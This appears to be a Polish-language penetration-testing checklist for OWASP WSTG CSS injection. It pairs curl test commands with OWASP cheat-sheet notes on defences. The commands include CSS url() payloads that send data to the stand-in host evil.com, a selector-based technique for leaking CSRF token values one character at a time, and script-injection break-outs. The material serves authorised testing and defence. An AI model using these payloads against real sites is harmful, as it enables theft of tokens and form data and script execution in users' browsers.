# WSTG-CLNT-05 — Testing for CSS Injection

## Cele

- Identify CSS injection points
- Assess the impact of the injection

## KOMENDY

### CSS injection

```bash
curl -s "https://TARGET/page?style=color:red;background:url(http://evil.com/steal)"
curl -s "https://TARGET/page?input=</style><script>alert(1)</script>"
curl -s "https://TARGET/page?color=red;}</style><script>alert(1)</script><style>"

```

### CSS data exfiltration

```bash
# input[value^="a"]{background:url(http://evil.com/a)}
curl -s "https://TARGET/page?css=input[value^='a']{background:url(http://evil.com/a)}"

```

## KOMENDY Z WORDLISTAMI

### PayloadsAllTheThings CSS Injection

```bash
# Referencja: Desktop/WSTG/PayloadsAllTheThings-master/CSS Injection/README.md

```

## WERYFIKACJA MANUALNA (Burp Suite / Przegladarka / DevTools)

1. Zidentyfikuj miejsca gdzie user input trafia do CSS (style attrs, CSS files)
2. Testuj wstrzykiwanie CSS properties
3. Sprawdz mozliwosc exfiltracji danych via CSS selectors
4. Testuj break z kontekstu CSS do HTML/JS


---

## CHEATSHEET OWASP — Kluczowe wskazówki

> Źródło: OWASP CheatSheetSeries — Securing_Cascading_Style_Sheets_Cheat_Sheet.md

### CSS Injection — co jest mozliwe

- **Data exfiltration via CSS selectors**: `input[value^="a"] { background: url(https://evil.com/a) }` — odczyt wartosci pol
- **Keylogging via CSS**: font-face + unicode-range — wykrywanie wcisnietych klawiszy
- **UI redressing**: zmiana wygladu strony, ukrywanie/wyswietlanie elementow
- **JavaScript execution** (legacy): `expression()` (IE), `-moz-binding` (stary Firefox)

### Niebezpieczne konstrukcje CSS

- `expression()` — wykonuje JavaScript (tylko IE, ale testuj)
- `url()` — laduje zewnetrzne zasoby (exfiltracja danych)
- `@import` — laduje zewnetrzny CSS (injection zewnetrznego arkusza)
- `behavior:` — laduje HTC files (IE)
- `-moz-binding:` — laduje XBL (stary Firefox)

### Obrona

- **NIE wstawiaj user input** do atrybutu `style` ani do arkuszy CSS
- **CSP `style-src`**: ogranicz zrodla CSS — `style-src 'self'` — blokuj inline styles jesli mozliwe
- **Sanityzuj CSS**: usun `expression()`, `url()`, `@import`, `behavior:`, `-moz-binding:`
- **Allowlist wlasciwosci CSS**: pozwol tylko na bezpieczne (color, font-size, margin) — denylist jest niewystarczajacy
- **Uzywaj CSS classes** zamiast inline styles — latwe do kontrolowania

### CSS Exfiltration — jak dziala

- Atakujacy wstrzykuje CSS selector: `input[name="csrf"][value^="abc"] { background: url(evil.com/abc) }`
- Przegladarka laduje URL gdy selector pasuje → atakujacy dowiaduje sie o wartosci pola
- Iteracja po znakach: `value^="a"`, `value^="ab"`, `value^="abc"` → pelna wartosc
- Obrona: nie pozwalaj na user-controlled CSS, uzywaj CSP

## ROZSZERZENIA BURP SUITE

Brak dedykowanych rozszerzen Burp dla tego testu.

---

## Wskazówki ASVS

Powiązane wymagania z OWASP ASVS 5.0 — dobre praktyki do weryfikacji podczas testu.

### L2 (Standardowy)

| ID | Sekcja | Wymaganie |
|---|---|---|
| V1.3.5 | Sanitization | Verify that the application sanitizes or disables user-supplied scriptable or expression template language content, such as Markdown, CSS or XSL stylesheets, BBCode, or similar. |
